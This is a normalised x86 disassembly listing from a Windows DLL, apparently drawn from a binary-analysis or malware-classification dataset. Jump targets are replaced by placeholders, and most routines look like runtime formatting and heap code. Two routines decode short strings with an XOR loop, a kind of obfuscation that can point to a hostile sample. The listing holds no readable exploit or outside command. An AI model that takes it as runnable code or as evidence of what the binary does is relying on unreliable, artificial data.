mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_10012efb
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_10080400
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_100803cd
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_1002fb6b
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_100823c0
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_100803cd
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_1007fa90
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_10080400
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_100803cd
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_10012efb
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10033f7e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
mov edx [ ecx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx + 0x10 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x4
sub_10033fbc
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_10033fe0
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_1000ecb0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
mov [ ebp - 0x7c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea edx [ ebp - 0x80 ]
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x80 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ ebp - 0x8c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x32
call sub_10053240
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea esi [ ebp - 0x84 ]
push esi
mov [ ebp - 0x84 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov edi [ ebp - 0x84 ]
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x77
lea ecx [ ebp - 0x88 ]
push ecx
mov [ ebp - 0x88 ] ebx
call sub_10029450
mov esi [ ebp - 0x88 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
inc ecx
mov [ ebp - 0x8c ] ecx
cmp ecx [ ebp - 0x80 ]
jl r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x90 ]
push esi
add eax 0x12c
call sub_10059130
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax ebx
je r-xdata
mov eax esi
call sub_1001f5f0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x123
jmp r-xdata
call sub_1006eeb0
call sub_10053240
sub_10034190
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
mov esi eax
xor eax eax
sub ecx eax
push edi
je r-xdata
mov [ esp + 0xc ] eax
dec ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi ]
cmp esi [ edx ]
je r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
dec ecx
jne r-xdata
mov eax edx
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x3c ] bl
jne r-xdata
add edi 0x4
cmp edi ecx
jne r-xdata
mov edi [ edx + 0x3a0 ]
mov ecx [ edx + 0x3a4 ]
cmp edi ecx
je r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi ]
mov eax [ esi + 0x30 ]
mov edx [ eax + 0x4 ]
add esi 0x30
test [ edx + esi + 0xc ] bl
jne r-xdata
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
test [ edx + eax + 0x2c ] 0x1
je r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xc8 ] eax
mov eax [ edi ]
cmp [ eax + 0xc8 ] 0xffffffff
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x2c ] bl
jne r-xdata
mov ecx [ edx + esi + 0x38 ]
mov edx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ecx ]
push 0x2
push edx
cdq
push edx
mov edx [ ebx + 0x28 ]
push eax
lea eax [ esp + 0x20 ]
push eax
call edx
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
lea ecx [ eax + edx + 0x20 ]
mov eax [ ecx + 0x38 ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x4
push 0x0
call sub_1001bdc0
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x58 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp edx [ r--data ]
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ ecx + esi + 0x38 ]
mov ebx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x8 ]
cdq
push edx
push eax
mov eax [ ebx + 0x28 ]
lea edx [ esp + 0x20 ]
push edx
call eax
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xcc ] eax
mov esi [ edi ]
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x4 ]
add esi 0x20
test [ ecx + esi + 0xc ] bl
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
add eax ecx
mov ecx [ eax + ecx + 0x58 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
call edx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
add eax ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edx [ r--data ]
jne r-xdata
push 0x0
call sub_1001bdc0
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
call sub_1001bdc0
or eax 0x4
sub_100343ea
push 0x38
mov eax sub_1008584a
call sub_1003fae8
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100275d9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10034a80
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1004642f
retn 0x20
sub_100344a0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007f50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100344d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x20 ]
test cx cx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push esi
push edi
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_1006e7c0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] edx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov edx [ eax ]
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push ecx
call sub_10070c30
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
sub_10034570
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_10017b10
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ esp + 0x10 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_1007f5d0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10034650
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ esp + 0xc ]
call sub_10017b10
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx 0xffff
cmp cx ax
je r-xdata
jg r-xdata
add [ ebp + 0x8 ] 0x2
add [ esp + 0x10 ] 0x1
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
lea edi [ esi + esi ]
push edi
push eax
mov eax [ edx ]
push eax
call sub_1007f5d0
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x24 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10034740
push ebp
mov ebp esp
push 0xffffffff
push sub_1008943c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xfc ] eax
mov edi ecx
mov esi edx
test ebx ebx
jne r-xdata
push ebx
push esi
push 0x0
call sub_10003f90
add esp 0xc
mov [ ebp - 0x100 ] eax
cmp eax 0xffffffd6
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov edx [ esi ]
inc edx
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push ebx
push esi
mov [ edi ] eax
push eax
mov eax [ ebp - 0xfc ]
call sub_10003f90
mov esi eax
add esp 0xc
test esi esi
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x43
call sub_10072600
mov eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
call sub_1005f2b0
xor edi edi
push eax
lea edx [ ebp - 0x88 ]
lea esi [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xcb
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0xac ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax [ edi ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x4c ]
mov eax 0x43
mov [ edi ] 0x0
call sub_10072600
lea ecx [ ebp - 0xdc ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x4c ]
lea esi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xcb
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x90 ] esi
jb r-xdata
xor eax eax
mov [ ebp - 0xac ] 0x7
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xc0 ] ax
cmp [ ebp - 0xe4 ] esi
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x90 ] 0x7
mov [ ebp - 0x94 ] 0x0
mov [ ebp - 0xa4 ] ax
cmp [ ebp - 0xc8 ] esi
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0xdc ]
push ecx
call sub_100187af
add esp 0x4
sub_10034950
push ebp
mov ebp esp
push 0xffffffff
push sub_1008874b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp edx 0x5
ja r-xdata
or eax 0xffffffff
jmp [ edx * 4 + jump_table_10034a5c ]
mov ecx [ ecx + 0x4 ]
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push 0xffffffff
push ecx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
lea edx [ ebp - 0x218 ]
push 0x5c
push edx
call sub_10023d8f
add esp 0x8
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ecx + 0x24 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
xor ecx ecx
lea edx [ ebp - 0x218 ]
lea edi [ ebp - 0x248 ]
lea esi [ ebp - 0x23c ]
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] ecx
call sub_10021cf0
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
add edi 0x1c
mov ecx esi
call sub_10059830
call sub_10070ff0
push 0x104
add eax 0x2
push eax
lea eax [ ebp - 0x218 ]
push 0x104
push eax
call sub_100198c8
add esp 0x10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10034a80
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10034acb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10035d06
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10034b00
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0x126
call sub_10053240
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_10023d8f
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_1007f940
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x1c ]
push 0x2e
push esi
call sub_10023d8f
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0x7c
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_1007f5d0
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa2
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x20 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_10023d8f
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10034ca0
push ebp
mov ebp esp
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc8
and edx 0xff
mov [ ebp + eax * 2 - 0xb8 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
